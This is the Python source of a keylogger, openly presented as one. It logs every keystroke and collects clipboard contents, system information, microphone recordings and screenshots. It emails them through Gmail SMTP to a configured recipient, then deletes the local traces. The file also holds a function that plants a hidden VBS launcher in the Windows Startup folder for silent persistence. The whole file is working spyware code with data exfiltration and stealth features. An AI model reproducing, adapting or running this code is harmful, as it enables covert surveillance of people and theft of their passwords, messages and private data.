import datetime
import getpass
import os
import smtplib
import time

from email.mime.application import MIMEApplication 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener
from signal import signal, SIGINT
from sys import exit

from config.keylogger_config import CLEAN_UP, CLIPBOARD_FILE_NAME, COMPUTER_INFO_FILE_NAME, ENC_PASS_FILENAME, EMAIL_SUBJECT, EMAIL_TEXT, FROM_EMAIL_ADDRESS, KEY_FILENAME, MICROPHONE_FILE_NAME, SCREENSHOT_FILE_NAME, TIME, TO_EMAIL_ADDRESS

from clipboard import get_clipboard_information
from computer_information import get_computer_information
from microphone import get_microphone
from pass_encryptation import decrypt_password, get_encrypted_key
from screenshot import get_screenshot


def _get_password():
    encrypted_password = get_encrypted_key()
    password = decrypt_password(encrypted_password)
    return password


def _get_files(keylogger_file):
    file_list = [keylogger_file]
    if MICROPHONE_FILE_NAME and os.path.exists(MICROPHONE_FILE_NAME):
        file_list.append(MICROPHONE_FILE_NAME)
    if COMPUTER_INFO_FILE_NAME and os.path.exists(COMPUTER_INFO_FILE_NAME):
        file_list.append(COMPUTER_INFO_FILE_NAME)
    if CLIPBOARD_FILE_NAME and os.path.exists(CLIPBOARD_FILE_NAME):
        file_list.append(CLIPBOARD_FILE_NAME)
    if SCREENSHOT_FILE_NAME and os.path.exists(SCREENSHOT_FILE_NAME):
        file_list.append(SCREENSHOT_FILE_NAME)
    return file_list


def send_email(files_to_attach):
    password = _get_password()

    msg = MIMEMultipart()
    text = EMAIL_TEXT
    msg['From'] = FROM_EMAIL_ADDRESS
    msg['To'] = TO_EMAIL_ADDRESS
    msg['Subject'] = EMAIL_SUBJECT
    msg.attach(MIMEText(text, 'plain'))

    for file in files_to_attach:
        attachment_content = open(file, 'rb').read()
        subtype = file[:-3]
        attachment = MIMEApplication(attachment_content, _subtype=subtype)
        attachment.add_header('Content-Disposition', "attachment; filename= %s" % str(file))
        msg.attach(attachment)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()


def clean_up(keylogger_filename):
    if CLEAN_UP:
        files = _get_files(keylogger_filename)
        for file in files:
            os.remove(file)
        if os.path.exists(ENC_PASS_FILENAME):
            os.remove(ENC_PASS_FILENAME)
        if os.path.exists(KEY_FILENAME):
            os.remove(KEY_FILENAME)


def key_listener():

    def signal_handler(signal, frame):
        print('Exiting keylogger ...')
        file.close()
        exit()


    def key_recorder(key):
        key = str(key)

        if key == 'Key.enter':
            file.write('\n')
        elif key == 'Key.space':
            file.write(' ')
        elif key == 'Key.backspace':
            file.write('%BORRAR%')
        else:
            file.write(key.replace("'", ""))

        if time.time()-t0 > TIME:
            # TODO: free the input
            file.close()
            get_clipboard_information(file_name)
            get_computer_information(file_name)
            # TODO: Would like to get the microphone at the same time at we log the keys.
            get_microphone()
            get_screenshot()
            files_to_attach = _get_files(file_name)
            send_email(files_to_attach)
            clean_up(file_name)
            exit()
    

    signal(SIGINT, signal_handler)

    date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

    file_name = 'test_keylogger_{}.txt'.format(date)

    file = open(file_name, 'w')
    file.write('### KEYLOGGER ###\n')

    t0 = time.time()

    with Listener(on_press=key_recorder) as l:
        l.join()


def add_keylogger_to_startup():
    USER_NAME = getpass.getuser()
    # TODO: Make it functional for Linux users too.
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        # TODO: Make it functional no matter what python version do you have.
        bat_file.write('python "keylogger.py"')

    # This avoids the console to pop-up.
    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScriptHost = Nothing\n')



if __name__ == '__main__':
    # add_keylogger_to_startup()
    key_listener()
